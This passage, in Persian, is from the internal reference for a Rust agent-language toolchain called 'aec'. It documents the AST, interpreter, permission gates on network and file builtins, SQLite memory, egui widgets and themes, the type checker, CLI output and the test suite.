impl Style { pub fn new(); get_string(); get_float(); get_bool() }   // ⚠️ StyleValue PartialEq ندارد
```

```rust
// ui.rs
pub struct UiDecl { pub name: Identifier, pub screen: ScreenExpr, pub span: Span }
pub struct ScreenExpr { pub title: String, pub body: Vec<UiStatement>, pub span: Span }

pub enum UiStatement {
    State(StateDeclUi),
    Element(ElementExpr),
    If(UiIf),
    For(UiFor),
    Component(ComponentUse),
}

pub struct ComponentDecl { pub name: Identifier, pub props: Vec<ComponentProp>,
                           pub render: Option<Vec<UiStatement>>, pub span: Span }
pub struct ComponentProp { pub name: Identifier, pub ty: Option<TypeRef>, pub span: Span }
pub struct ComponentUse  { pub name: Identifier, pub props: Vec<ElementProperty>, pub span: Span }

pub struct StateDeclUi { pub name: Identifier, pub ty: Option<TypeRef>, pub initial: Expr, pub span: Span }
pub struct ElementExpr { pub name: Identifier, pub primary_arg: Option<Expr>,
                         pub modifiers: Vec<ElementModifier>,
                         pub children: Option<Vec<UiStatement>>,
                         pub style: Style, pub span: Span }
pub enum ElementModifier { Property(ElementProperty), Binding(Binding), Event(EventHandler) }
pub struct ElementProperty { pub name: Identifier, pub value: Expr, pub span: Span }
pub struct Binding { pub target: Identifier, pub source: Expr, pub span: Span }
pub struct EventHandler { pub event: Identifier, pub handler: Expr, pub span: Span }
pub struct UiIf  { pub condition: Expr, pub then_body: Vec<UiStatement>,
                   pub else_body: Option<Vec<UiStatement>>, pub span: Span }
pub struct UiFor { pub variable: Identifier, pub iterable: Expr,
                   pub body: Vec<UiStatement>, pub span: Span }
pub enum TypeRef { String, Int, Float, Bool, Array(Box<TypeRef>), Named(String) }   // ⚠️ PartialEq ندارد
```

```rust
// theme.rs
pub struct ThemeDecl { pub name: Identifier, pub is_default: bool,
                       pub extends: Option<Identifier>, pub groups: Vec<ThemeGroup>, pub span: Span }
pub struct ThemeGroup { pub name: Identifier, pub entries: Vec<ThemeEntry>, pub span: Span }
pub struct ThemeEntry { pub name: Identifier, pub value: StyleValue, pub span: Span }
```

```rust
// expr.rs
pub enum Expr {
    Literal(Box<LiteralExpr>), Identifier(Identifier), Paren(Box<ParenExpr>),
    Array(Box<ArrayExpr>), Object(Box<ObjectExpr>), Binary(Box<BinaryExpr>),
    Unary(Box<UnaryExpr>), Call(Box<CallExpr>), Member(Box<MemberExpr>),
    Index(Box<IndexExpr>), Await(Box<AwaitExpr>), Match(Box<MatchExpr>),
    Try(Box<TryExpr>),        // 🆕 جلسهٔ ۴ — `expr?`
    Lambda(Box<LambdaExpr>),  // 🆕 جلسهٔ ۴ — `x => expr`
}
impl Expr { pub fn span(&self) -> Span }

// 🆕 جلسهٔ ۴
pub struct TryExpr    { pub inner: Expr, pub span: Span }
pub struct LambdaExpr { pub params: Vec<Identifier>, pub body: Expr, pub span: Span }

pub struct LiteralExpr { pub value: Literal, pub span: Span }
pub struct ParenExpr { pub inner: Expr, pub span: Span }
pub struct ArrayExpr { pub elements: Vec<Expr>, pub span: Span }
pub struct ObjectExpr { pub fields: Vec<ObjectField>, pub span: Span }
pub struct ObjectField { pub key: Identifier, pub value: Expr, pub span: Span }
pub struct BinaryExpr { pub left: Expr, pub op: BinaryOp, pub right: Expr, pub span: Span }
pub enum BinaryOp { Eq, Neq, Lt, Gt, Lte, Gte, Add, Sub, Mul, Div, Mod, And, Or }  // Copy + PartialEq
impl BinaryOp { pub fn precedence(self) -> u8; pub fn as_str(self) -> &'static str }
pub struct UnaryExpr { pub op: UnaryOp, pub operand: Expr, pub span: Span }
pub enum UnaryOp { Neg, Not }
pub struct CallExpr { pub callee: Expr, pub args: Vec<Argument>, pub span: Span }
pub struct Argument { pub name: Option<Identifier>, pub value: Expr, pub span: Span }
pub struct MemberExpr { pub object: Expr, pub property: Identifier, pub span: Span }
pub struct IndexExpr { pub object: Expr, pub index: Expr, pub span: Span }
pub struct AwaitExpr { pub inner: Expr, pub span: Span }
pub struct MatchExpr { pub scrutinee: Expr, pub arms: Vec<MatchArm>, pub span: Span }
pub struct MatchArm { pub pattern: Pattern, pub body: MatchBody, pub span: Span }
pub enum MatchBody { Block(Block), Expr(Expr) }
pub enum Pattern { Wildcard(Span), Some(Identifier), None(Span), Literal(Literal), Identifier(Identifier) }
```

```rust
// function.rs
pub struct FunctionDecl { pub name: Identifier, pub params: Vec<Parameter>,
                          pub return_type: Option<TypeExpr>, pub body: Block, pub span: Span }
pub struct Parameter { pub name: Identifier, pub ty: TypeExpr, pub default: Option<Expr>, pub span: Span }
pub struct Block { pub statements: Vec<Statement>, pub span: Span }
pub enum Statement { Let(LetStmt), Assign(AssignStmt), Return(ReturnStmt),
                     Expr(Expr), If(IfStmt), While(WhileStmt), For(ForStmt) }
pub struct LetStmt { pub name: Identifier, pub ty: Option<TypeExpr>, pub value: Expr,
                     pub mutable: bool, pub span: Span }   // 🆕 mutable = `let`(false) / `var`(true)
pub struct AssignStmt { pub target: LValue, pub op: AssignOp, pub value: Expr, pub span: Span }
pub struct LValue { pub base: Identifier, pub path: Vec<LValueStep>, pub span: Span }
pub enum LValueStep { Member(Identifier), Index(Expr) }
pub enum AssignOp { Assign, AddAssign, SubAssign, MulAssign, DivAssign }
pub struct ReturnStmt { pub value: Option<Expr>, pub span: Span }
pub struct IfStmt { pub condition: Expr, pub then_block: Block, pub else_branch: Option<ElseBranch>, pub span: Span }
pub enum ElseBranch { ElseIf(Box<IfStmt>), Else(Block) }
pub struct WhileStmt { pub condition: Expr, pub body: Block, pub span: Span }
pub struct ForStmt { pub variable: Identifier, pub iterable: Expr, pub body: Block, pub span: Span }
pub enum TypeExpr { String, Int, Float, Bool, Bytes, Unit, Uuid, Timestamp,
                    Function,                    // 🆕 جلسهٔ ۴ — کلیدواژهٔ `function`
                    Named(Identifier), Optional(Box<TypeExpr>), Array(Box<TypeExpr>),
                    Result(Box<TypeExpr>, Box<TypeExpr>) }   // 🆕 جلسهٔ ۴ — `Result(int, string)`
```

```rust
// literal.rs
pub enum Literal { String(String), Interpolated(Vec<InterpPart>), RawString(String),
                   Int(i64), Float(f64), Duration(Duration), ByteSize(u64), Bool(bool),
                   Uuid(Uuid), None }
pub struct Duration { pub value: u64, pub unit: DurationUnit }
pub enum DurationUnit { Milliseconds, Seconds, Minutes, Hours, Days }   // to_ms(), as_str()
pub enum InterpPart { Text(String), Expr(Expr) }   // ⚠️ جلسهٔ ۴: `Expr` واقعی شد (قبلاً String بود)
impl Literal { as_str(), as_int(), as_bool() }
```

> `Literal::Interpolated` وجود دارد ولی **پارسر آن را تولید نمی‌کند** (interpolation پیاده نشده).

```rust
// error.rs
pub struct ParseError { pub span: Span, pub kind: ParseErrorKind }
pub enum ParseErrorKind {
    UnexpectedToken { expected: Vec<String>, found: String },
    UnexpectedEof { expected: Vec<String> },
    InvalidLiteral { literal_type: String },
    UnterminatedString,
    InvalidEscape { sequence: String },
    BuildError { message: String },
}
```

---

## ۸) Runtime Reference (`aec-runtime`)

```rust
pub enum Value {
    Int(i64), Float(f64), String(String), Bool(bool), None,
    Array(Vec<Value>), Object(HashMap<String, Value>), Function(Rc<Function>),
    Result(std::result::Result<Box<Value>, Box<Value>>),   // 🆕 جلسهٔ ۴ — ok(v) / err(e)
    Closure(Rc<Closure>),                                  // 🆕 جلسهٔ ۴ — lambda
}
impl Value { pub fn type_name(&self) -> &'static str; pub fn is_truthy(&self) -> bool
             pub fn ok(v: Value) -> Self; pub fn err(v: Value) -> Self }   // 🆕
// type_name: int|float|string|bool|none|array|object|function|result
// ⚠️ Closure هم "function" گزارش می‌شود (نه "closure")
// Display: `ok(1)` / `err(boom)` / `<lambda>`

// 🆕 جلسهٔ ۴
pub struct Closure { pub params: Vec<String>, pub body: aec_ast::Expr, pub env: Env }

pub struct Function { pub name: String, pub params: Vec<String>,
                      pub body: aec_ast::Block, pub env: Env }
pub type Env = Rc<RefCell<Environment>>;
pub struct Environment { pub vars: HashMap<String, Value>, pub parent: Option<Env> }
// Environment::new(), with_parent(parent), get(&str), set(String, Value),
// assign(&str, Value) -> bool, has_local(&str)

pub struct Interpreter {
    pub global: Env,
    pub memory: Memory,
    pub permissions: Option<Permissions>,   // ۱۸.۲ — None = هیچ گیتی اعمال نمی‌شود
    pub limits: Limits,                     // ۱۸.۲
}
impl Interpreter {
    pub fn new() -> Self;
    pub fn run(&mut self, program: &Program) -> Result<(), RuntimeError>;
    pub fn call_function(&mut self, name: &str, args: Vec<Value>, span: Span) -> Result<Value, RuntimeError>;
    pub fn eval_expr(&mut self, expr: &Expr, env: Env) -> Result<Value, RuntimeError>;
}
```

> ⚠️ **`Interpreter::run` فقط `Function` + `Permissions` + `Limits` را می‌خواند.**
> `Import`، `Ui`، `Component`، `Theme` را **نادیده می‌گیرد** (import بی‌صدا دور ریخته می‌شود → آیتم ۱۸.۶).

### مجوزها و سقف‌ها (۱۸.۲)

```rust
// aec-runtime/src/permissions.rs
pub const DEFAULT_HTTP_TIMEOUT_MS: u64 = 30_000;
pub enum FsMode { Read, Write }

pub struct Permissions {
    pub network: Option<Vec<String>>,   // None = کلید اعلام نشده → هیچ هامی مجاز نیست
    pub fs_read: Option<Vec<String>>,   // None = هیچ مسیری مجاز نیست
    pub fs_write: Option<Vec<String>>,
    pub system_metrics: bool,
    pub system_restart: bool,
}
impl Permissions {
    pub fn from_block(&PermissionsBlock) -> Self;
    /// گیت مرکزی: نام builtin + آرگومان‌ها → allow/deny. نام ناشناخته = Ok.
    pub fn check_builtin(&self, name: &str, args: &[Value]) -> Result<(), String>;
    pub fn check_network(&self, url: &str) -> Result<(), String>;
    pub fn check_fs(&self, path: &str, mode: FsMode) -> Result<(), String>;
    pub fn check_system_metrics(&self) -> Result<(), String>;
}
pub fn denied(message: String, span: Span) -> RuntimeError;   // → PermissionDenied

pub struct Limits { pub concurrency: Option<u64>, pub timeout_ms: Option<u64> }
impl Limits {
    pub fn from_block(&LimitsBlock) -> Self;
    pub fn http_timeout(&self) -> Duration;   // timeout_ms یا ۳۰ ثانیه
}
// همچنین: extract_host(&str) -> Option<String>، normalize_path(&str, &Path) -> PathBuf
```

**محل گیت:** ابتدای `Interpreter::try_builtin`، **قبل از** delegating به stdlib:
```rust
if let Some(perms) = &self.permissions {
    perms.check_builtin(name, args)
        .map_err(|message| crate::permissions::denied(message, span))?;
}
```

**نگاشت builtin → مجوز** (در `check_builtin`):

| مجوز | builtinها (هر دو شکل dot و underscore) |
|---|---|
| network | `http.get/post/put/delete` |
| filesystem.read | `file.read/exists/size/list_dir`، `ls` |
| filesystem.write | `file.write/append/delete/mkdir` |
| **هر دو** | `file.copy` (arg0=read، arg1=write) |
| system.metrics | `sys.info` |
| **گیت‌نشده** | `shell.run` (⚠️ به بخش ۱۷ نگاه کن)، `sys.exit`، همهٔ توابع کاربر |

`.timeout(limits.http_timeout())` در چهار درخواست HTTP اعمال می‌شود
(`stdlib.rs` × ۲ و `stdlib_extended.rs` × ۲) — یعنی `limits { timeout: 10s }` واقعی است.

### builtinها (نام‌های دقیق)

**`try_builtin` در `interpreter.rs`:**
```
abs contains float has int join keys len llm.complete llm_complete lower max
memory.add memory_add memory.clear memory_clear memory.count memory_count
memory.get memory_get memory.open memory_open
min pop pow print push push_to range read_line
replace split sqrt str trim upper values
```

**`stdlib.rs` + `stdlib_extended.rs`:**
```
env.get env_get env.set env_set
file.read file_read file.write file_write file.append file_append file.exists file_exists
file.delete file_delete file.copy file_copy file.mkdir file_mkdir file.size file_size file.list_dir file_list_dir
http.get http_get http.post http_post http.put http_put http.delete http_delete
json.parse json_parse json.stringify json_stringify
time.now_ms time_now_ms time.now_sec time_now_sec time.sleep time_sleep
sys.exit sys_exit sys.args sys_args sys.env_all sys_env_all sys.info sys_info
math.sin math_sin math.cos math_cos math.tan math_tan math.log math_log
math.floor math.ceil math.round math.exp math.random math.random_int
math.pi math_pi math.e math_e math.tau math_tau
sin cos tan log floor ceil round exp random random_int pi e
crypto? (md5/sha2/base64 به‌عنوان deps؛ نام‌های builtin را در فایل ببین)
regex.find regex_find regex.find_all regex_find_all regex.match regex_match regex.replace regex_replace
shell.run shell_run  (و: sh, ls, cwd, os, arch, family, hostname, user, exit_code, stdout, stderr, success, status)
uuid  sort first last reverse slice repeat char_at starts_with ends_with
now now_ms sleep
```

> ⚠️ الگوی نام‌گذاری دوگانه است: هم `file.read` و هم `file_read` (dot و underscore).
> اگر builtin جدید اضافه می‌کنی، **هر دو شکل** را ثبت کن.

**`errors.rs` — `RuntimeError`:**
```rust
pub enum RuntimeError {
    UndefinedVariable, TypeError, DivisionByZero, UndefinedFunction, WrongArgCount,
    ReturnOutsideFunction, BreakOutsideLoop,
    PermissionDenied { message: String, span: Span },   // ← جدید در ۱۸.۲
    Generic { message: String, span: Span },
}
impl RuntimeError {
    pub fn span(&self) -> Span;
    /// جایگزینی span با موقعیت واقعی فراخوانی.
    /// ماژول‌های بدون دسترسی به span (memory، permissions) با `Span::dummy()`
    /// خطا می‌سازند و لایهٔ interpreter آن را مکان‌دار می‌کند.
    pub fn with_span(self, span: Span) -> Self;
}
```
> 🆕 **جلسهٔ ۴:** variant داخلی `#[doc(hidden)] EarlyReturn { value: Box<Value> }` اضافه شد.
> این **خطا نیست**، سیگنال کنترل‌جریان برای `?` است: در `Expr::Try` ساخته می‌شود و **فقط** در
> `Interpreter::call_function` و `call_closure` گرفته می‌شود و آنجا به
> `Value::Result(Err(value))` تبدیل می‌شود. نباید از یک برنامه بیرون بزند.
> `span()` برای آن `Span::dummy()` می‌دهد و `with_span` آن را دست‌نخورده رد می‌کند.
> ⚠️ Display همچنان انگلیسی است، ولی **متن** پیام‌ها هم از این جلسه انگلیسی شده‌اند.
> **`RuntimeError` derive `Clone` دارد** — پس `rusqlite::Error` را نمی‌توان داخلش گذاشت؛
> همهٔ خطاهای I/O به `Generic { message }` تبدیل می‌شوند.

**`memory.rs`:** (بعد از ۱۸.۱ بازنویسی شد — دو backend دارد)
```rust
pub struct Message { pub role: String, pub content: String }   // + PartialEq/Eq

pub struct Memory {
    pub conversations: HashMap<String, Vec<Message>>,   // فقط برای حالت in-memory
    db: Option<Connection>,                             // Some = SQLite پیوسته
}
impl Memory {
    pub fn new() -> Self;                    // = in_memory()، رفتار قبلی، بدون تغییر
    pub fn in_memory() -> Self;              // نام صریح
    pub fn open(path: impl AsRef<Path>) -> Result<Self, RuntimeError>;   // SQLite + ساخت جدول
    pub fn is_persistent(&self) -> bool;
    pub fn add(&mut self, conv_id, role, content) -> Result<(), RuntimeError>;   // ⚠️ حالا Result
    pub fn get(&self, conv_id) -> Result<Vec<Message>, RuntimeError>;            // ⚠️ حالا Result
    pub fn clear(&mut self, conv_id) -> Result<(), RuntimeError>;                // ⚠️ حالا Result
    pub fn len(&self, conv_id) -> Result<usize, RuntimeError>;                   // ⚠️ حالا Result
    pub fn is_empty(&self, conv_id) -> Result<bool, RuntimeError>;
    pub fn to_value(&self, conv_id) -> Result<Value, RuntimeError>;              // ⚠️ حالا Result
}
```
> **تصمیم قفل‌شده (۱۸.۱):** در حالت پیوسته، **دیتابیس منبع حقیقت است، نه کش**.
> یعنی `get`/`len` مستقیماً از SQLite می‌خوانند. دلیل: اگر کش می‌شد، دو نمونهٔ هم‌زمان
> روی یک فایل بی‌صدا واگرا می‌شدند. تست این رفتار: `sqlite_reads_see_writes_from_another_instance`.
>
> **`with_span`:** `memory.rs` به span دسترسی ندارد، پس خطاها را با `Span::dummy()` می‌سازد؛
> لایهٔ interpreter با `RuntimeError::with_span(span)` آن‌ها را مکان‌دار می‌کند.
> این متد در `errors.rs` اضافه شد و برای هر ماژول بدون-span دیگری هم قابل استفاده است.
>
> ⚠️ بدون بلاک/فراخوانی `memory.open`، حافظه **in-memory** می‌ماند (رفتار قبلی) — هیچ
> برنامه‌ای نمی‌شکند. `memory.open` نمونهٔ سراسری `Interpreter::memory` را **جایگزین** می‌کند.

**`llm.rs`:**
```rust
pub fn llm_complete(...)   // ⚠️ فقط یک تابع؛ provider trait، streaming، retry ندارد.
```

---

## ۹) UI Reference (`aec-ui`)

### Widget tree

```rust
pub enum Widget {
    Column(Vec<Widget>, WidgetStyle),
    Row(Vec<Widget>, WidgetStyle),
    Text(String, WidgetStyle),
    Display { var_name: String, style: WidgetStyle },
    Divider,
    Heading(String, WidgetStyle),
    Spacer,
    Input { bind_target: Option<String>, placeholder: Option<String>, value: String, style: WidgetStyle },
    Button { label: String, on_click: Option<String>, style: WidgetStyle },
    Card(Vec<Widget>, WidgetStyle),
    Container(Vec<Widget>),
    MessagesList { source: String, style: WidgetStyle },
    If { condition: bool, then_branch: Vec<Widget>, else_branch: Option<Vec<Widget>> },
    For { variable: String, items: Vec<Widget> },
}

pub struct WidgetStyle { pub properties: HashMap<String, StyleValue> }
impl WidgetStyle { new(), from_style(&Style), get_string(&str)->Option<String>,
                   get_float(&str)->Option<f64>, get_bool(&str)->Option<bool> }

pub struct UiState { pub values: HashMap<String, UiValue> }
pub enum UiValue { String(String), Int(i64), Float(f64), Bool(bool),
                   Array(Vec<UiValue>), Object(HashMap<String, UiValue>) }
impl UiValue { as_string(), as_bool(), as_array() }
impl UiState { new(), get_string(&str)->String, set_string(&str, String), get_bool(&str)->bool,
               get_value(&str)->Option<&UiValue> }
```

### Componentها و Themeها

```rust
pub type ComponentRegistry = HashMap<String, ComponentDecl>;

pub struct ResolvedTheme { pub tokens: HashMap<String, StyleValue> }   // کلید = "group.token"
impl ResolvedTheme { get(&str)->Option<&StyleValue>; insert(group, token, StyleValue) }

pub struct Themes { pub named: HashMap<String, ResolvedTheme>, pub default: Option<ResolvedTheme> }
impl Themes {
    pub fn from_items(items: &[TopLevelItem]) -> Self;   // extends را حل می‌کند
    pub fn get(&self, name: &str) -> Option<&ResolvedTheme>;
    pub fn active(&self) -> Option<&ResolvedTheme>;      // تم فعال برای resolve
}
```

**قاعدهٔ انتخاب تم فعال:** تمی که `default` دارد؛ وگرنه اگر **تنها یک** تم در برنامه باشد، همان.

### API ساخت widget

```rust
pub fn build_widgets(statements, state) -> Vec<Widget>;                                   // سازگاری، registry/theme خالی
pub fn build_widgets_with_components(statements, state, &ComponentRegistry) -> Vec<Widget>;
pub fn build_widgets_with_themes(statements, state, &ComponentRegistry, &Themes) -> Vec<Widget>;
// داخلی:
fn build_widgets_full(statements, state, components, themes) {
    let active_theme = themes.active().cloned().unwrap_or_default();
    let mut ctx = BuildCtx { components, theme: &active_theme, active: HashSet::new() };
    build_widgets_in_context(statements, state, &mut ctx)
}
struct BuildCtx<'a> { components: &'a ComponentRegistry, theme: &'a ResolvedTheme, active: HashSet<String> }
```

> ⚠️ `build_widgets` و `build_widgets_with_components` را **حذف نکن** (سازگاری + تست‌ها).

### زنجیرهٔ ساخت (خیلی مهم)

```
build_widgets_full
 ├─ build_widgets_in_context   (for هر statement)
 │   └─ build_widget_in_context
 │       ├─ UiStatement::State     → expr_to_value → state.values.insert(...)  (None برمی‌گرداند)
 │       ├─ UiStatement::Element   → build_element_in_context
 │       ├─ UiStatement::If        → build_if_in_context
 │       ├─ UiStatement::For       → build_for_in_context
 │       └─ UiStatement::Component → build_component_in_context
 │
 ├─ build_element_in_context
 │   ├─ build_element_style(el, ctx.theme)        ← ادغام style block + inline + resolve توکن
 │   ├─ Column/Row/Card → children را با همان ctx می‌سازد
 │   ├─ Text/Heading/Display → apply_text_defaults(...)
 │   ├─ Card → apply_surface_default(...)
 │   └─ ناشناخته → Widget::Container(children)
 │
 └─ build_component_in_context
     ├─ active guard (recursion)
     ├─ state والد را clone می‌کند
     ├─ propها را با expr_to_value(&prop.value, parent_state) ارزیابی می‌کند
     ├─ بدنهٔ render را با state کامپوننت expand می‌کند
     └─ Widget::Container(children)
```

### توابع کمکی مهم در `widgets.rs`

```rust
fn build_element_style(el, theme) -> WidgetStyle          // style block + inline، با resolve توکن
fn resolve_style_value(&StyleValue, theme) -> Option<StyleValue>   // theme.x.y → مقدار؛ ناموجود → None (حذف)
fn expr_to_style_value(&Expr, theme) -> Option<StyleValue>
fn expr_token_path(&Expr) -> Option<String>               // Member chain → "theme.color.primary"
fn apply_text_defaults(ws, theme) -> WidgetStyle          // color.text / text.size / text.weight
fn apply_surface_default(ws, theme) -> WidgetStyle        // color.surface
fn eval_condition(&Expr, &UiState) -> bool
fn eval_value(&Expr, &UiState) -> String
fn eval_text_expr(&Expr, &UiState) -> String
fn expr_to_string(&Expr) -> Option<String>
fn expr_to_value(&Expr, &UiState) -> UiValue              // literal | identifier | array | object
fn extract_fn_name(&Expr) -> Option<String>
```

### رندرر (`renderer.rs`)

```rust
pub struct AecApp {
    pub program: Program,
    pub interpreter: Arc<Mutex<Interpreter>>,
    pub ui_decl: UiDecl,
    pub components: ComponentRegistry,
    pub themes: Themes,
    pub widgets: Vec<Widget>,
    pub state: UiState,
    pub state_var_names: HashSet<String>,
    pub fonts_loaded: bool,
}
impl AecApp {
    pub fn new(program: Program, ui: UiDecl) -> Result<Self, String>;
    fn load_fonts(&mut self, ctx);            // Vazirmatn
    fn execute_event(&mut self, fn_name);     // sync → call → sync → rebuild با تم
}
fn sync_state_to_interpreter(state, interp, var_names);
fn sync_state_from_interpreter(state, interp, var_names);
fn ui_value_to_aec_value(&UiValue) -> Value;
fn aec_value_to_ui_value(&Value) -> UiValue;
fn parse_color(&str) -> Option<egui::Color32>;      // #rgb, #rrggbb, #rrggbbaa, نام‌ها
fn style_value_color(&StyleValue) -> Option<egui::Color32>;
fn make_text(&str, &WidgetStyle) -> egui::RichText;
fn render_widget / render_widgets;
pub fn run_ui(program: &Program, ui: &UiDecl) -> Result<(), eframe::Error>;
```

نکات رندرر:
- `update()` پس‌زمینهٔ پنل را از `theme.color.background` می‌گیرد (اگر تم فعال داشته باشد).
- `Widget::MessagesList` پیام‌ها را **زنده از state** می‌خواند (`state.get_value(source).as_array()`)
  و هر آیتم باید `UiValue::Object` با کلیدهای `role` و `content` باشد.
- دکمه‌ها با `on click -> fn` رویداد را در `pending` می‌گذارند و بعد از رندر `execute_event` صدا زده می‌شود.
- `Widget::Display` مقدار را از `state.get_string(var_name)` می‌خواند.

---

## ۱۰) Type Checker Reference (`aec-check`)

### API

```rust
pub fn check_program(program: &Program) -> Vec<Diagnostic>;
pub fn error_count(diags: &[Diagnostic]) -> usize;

pub struct Checker { /* ... */ }
impl Checker {
    pub fn new() -> Self;
    pub fn check_program(mut self, program: &Program) -> Vec<Diagnostic>;
}
```

```rust
pub enum Ty {
    Int, Float, String, Bool, Bytes, Uuid, Timestamp, None, Unit,
    Array(Box<Ty>), Object(Vec<(String, Ty)>), Function, Optional(Box<Ty>), Any,
}
impl Ty { pub fn is_any(); pub fn is_numeric(); pub fn is_bool(); pub fn numeric_result(a,b) -> Ty }
impl fmt::Display for Ty   // برای پیام‌ها

pub fn ty_from_expr(&TypeExpr) -> Ty;       // Named(_) → Any   (struct پشتیبانی نمی‌شود)
pub fn compatible(expected: &Ty, actual: &Ty) -> bool;
```

```rust
pub enum Severity { Error, Warning }
pub enum DiagKind { TypeMismatch, InvalidOperand, ArityMismatch, NotCallable, NotIndexable, UndeclaredVariable }
pub struct Diagnostic { pub severity, pub kind, pub message: String, pub span: Span }   // PartialEq/Eq
impl Diagnostic { pub fn error(kind, span, msg); pub fn warning(kind, span, msg); pub fn is_error() -> bool }
impl fmt::Display for Diagnostic   // "line:col: error: message"
```

### الگوریتم

```
check_program:
  1. collect_globals   → BUILTIN_NAMESPACES + BUILTIN_FUNCTIONS + نام مدل‌ها
  2. collect_functions → نام → (params:[(Ty, has_default)], ret Ty)   // ret پیش‌فرض Unit
  3. برای هر TopLevelItem::Function → check_function
```

```
check_function: expected_return = sig.ret  →  scope با پارامترها  →  check_block(body)

check_statement:
  Let      → expr_ty(value)؛ اگر ty اعلام شده، compatible چک می‌شود؛ نام bind می‌شود
  Assign   → type متغیر (با پیمایش path) و value چک؛ op حسابی → numeric لازم
  Return   → مقدار با expected_return چک می‌شود
  Expr     → expr_ty (برای دیدن خطاهای داخلی)
  If       → condition + دو بلوک (هر کدام scope جدید)
  While    → condition + بلوک
  For      → iterable باید Array باشد (وگرنه Any)؛ variable = element type؛ بلوک

expr_ty: Literal | Identifier | Paren | Array | Object | Binary | Unary | Call
       | Member | Index | Await | Match
  - Array: اگر همهٔ عناصر یکسان → Array(t)، وگرنه Array(Any)
  - Object: Object(vec![(field, ty)])
  - Member روی Object شناخته‌شده → نوع فیلد؛ وگرنه Any
  - Index روی Array → element type؛ وگرنه Any
  - Match: join نوع شاخه‌ها
  - Call: اگر تابع کاربر باشد → arity + نوع آرگومان چک؛ اگر متغیر غیرتابع باشد → NotCallable
          وگرنه Any (built-in ناشناخته)
```

### قواعد ملایم‌سازی (چرا خطای کاذب نمی‌دهد)

- `Any` با همه‌چیز سازگار است.
- `Int ↔ Float` سازگارند (coercion).
- `Optional(T)` با `None` و با `T` سازگار است.
- `Object` اگر فیلدهای مقدار واقعی ناشناخته باشند (لیست خالی) سازگار گرفته می‌شود.
- **متغیر تعریف‌نشده = Warning، نه Error** (چون globalهای runtime ایستا شناخته نیستند).
- `Await` → Any (نوع inner را برمی‌گرداند در واقعیت پیاده‌شده).

### لیست‌های hardcode (اگر builtin جدید اضافه کردی، این‌ها را هم به‌روز کن)

```rust
const BUILTIN_NAMESPACES: &[&str] = &[
    "secrets","memory","ui","system","env","file","http","json","time","math","sys",
    "crypto","regex","shell","uuid","log",
];
const BUILTIN_FUNCTIONS: &[&str] = &[
    "sleep","now_ms","now","random","random_int","sort","push","push_to","print","len",
    "str","int","float","bool","exit","args",
];
```

> این دو لیست با واقعیت runtime **کامل منطبق نیستند** (مثلاً `min`, `max`, `keys`, `values`,
> `split`, `join`, `trim`, `upper`, `lower`, `contains`, `replace`, `range`, `sqrt`, `pow`,
> `abs`, `read_line` در لیست نیستند). به‌روز کردن این‌ها یک آیتم کوچک و ارزشمند است (بخش ۱۸.۱۳).

---

## ۱۱) CLI Reference (`aec-cli`)

```
aec check <file>          # پارس + بررسی نوع
aec ast   <file>          # چاپ {:#?} برنامه
aec run   <file> [--entry <fn>] [--cli]
```

**خروجی `check` (موفق):**
```
→ Checking path/to/file.aec

✅ Parse successful!

   Agent: Name
   Items: 4
   UI blocks: 1

✅ Type check passed
```

**خطای پارس:**
```
❌ Parse failed!

   error: انتظار یکی از این‌ها بود: unary_expr
    --> 4:13
     |
   4 |     let x = 
     |             ^

```
→ exit code = 1

**خطای نوع:** برای هر تشخیص یک بلوک:
```
   error: نوع نامعتبر در let «x»: انتظار int بود، string داده شد
     --> 13:5
      |
   13 |     let x: int = "hello"
      |     ^^^^^^^^^^^^^^^^^^^^

❌ Type check failed! (3 error(s), 1 warning(s))
```
- هشدارها بلوک `warning:` می‌سازند و در پایان `⚠️  Type check passed with N warning(s)`
  چاپ می‌شود و **exit code = 0**.
- `check` از `aec_check::check_program` استفاده می‌کند (تابع `run_type_check` در `main.rs`).
- `run` **فعلاً بررسی نوع انجام نمی‌دهد** (آیتم ۱۸.۵).

**توابع مهم در `main.rs`:**

```rust
fn parse_error_message(&ParseErrorKind) -> String   // BuildError → فقط message (بدون پیشوند)
fn print_diag(source: &str, level: Level, message: &str, span: Span)   // رنگ + تورفتگی
fn run_type_check(source: &str, program: &Program) -> bool
fn cmd_check / cmd_ast / cmd_run
```

**`render.rs`:**

```rust
pub enum Level { Error, Warning }
impl Level { pub fn label(self) -> &'static str }
pub fn snippet(source: &str, span: Span) -> String;     // بلوک با caret
pub fn render(source: &str, level: Level, message: &str, span: Span) -> String;
```

> نکته: `snippet` بر مبنای **کاراکتر** (نه byte) حساب می‌کند تا با متن فارسی هم‌تراز شود.

---

## ۱۲) تست‌ها

| فایل | تعداد | پوشش |
|---|---|---|
| `crates/aec-check/tests/check.rs` | ۱۹ | چکر نوع: معتبرها، خطاها، هشدارها، موقعیت |
| `crates/aec-parser/tests/smoke.rs` | ۱۰ | agent/import/secrets/model |
| `crates/aec-parser/tests/expr.rs` | ۱۰ | توابع، let، نوع آرایه، `and`/`or` + اولویت |
| `crates/aec-parser/tests/component.rs` | ۲ | component decl + use |
| `crates/aec-parser/tests/theme.rs` | ۳ | theme decl + ارجاع توکن |
| `crates/aec-ui/src/widgets.rs` (`mod tests`) | ۱۸ | کامپوننت (۱۰) + تم (۸) |
| `crates/aec-cli/tests/cli_check.rs` | ۳ | باینری: موفق/خطا/arity |
| `crates/aec-cli/src/render.rs` (`mod tests`) | ۳ | snippet/render |
| `crates/aec-cli/tests/component_pipeline.rs` | ۱ | parse → registry → expand |
| `crates/aec-cli/tests/theme_pipeline.rs` | ۱ | parse → Themes → style حل‌شده |
| `crates/aec-runtime/tests/memory.rs` | ۱۱ | حافظه: in-memory (رگرسیون)، SQLite (reopen/ترتیب/ایزوله/clear/خطا)، e2e پارسر→interpreter |
| `crates/aec-parser/tests/literals.rs` | ۸ | 🆕 ترتیب `literal`: duration/byte_size/uuid vs int، خطر `${ }` |
| `crates/aec-parser/tests/permissions.rs` | ۷ | 🆕 پارس permissions/limits + خطاهای فیلد ناشناخته |
| `crates/aec-runtime/tests/permissions.rs` | ۱۹ | 🆕 allow/deny شبکه و فایل، `..`، symlink، prefix، system، limits، regression |
| `crates/aec-cli/tests/permissions_cli.rs` | ۶ | 🆕 روی باینری واقعی: خطای واضح، فایل ساخته‌نشدن، regression |
| `crates/aec-cli/tests/run_type_gate.rs` | ۲ | 🆕 (جلسهٔ ۴) `aec run` روی فایل دارای خطای نوع → خطا + exit 1 و اجرا **نمی‌شود** |
| `crates/aec-check/tests/check.rs` | ۴۰ | 🆕 (جلسهٔ ۴) +۲۱ تست: `var`/`let`، interpolation، `Result`/`?`، optional، lambda، `function` |
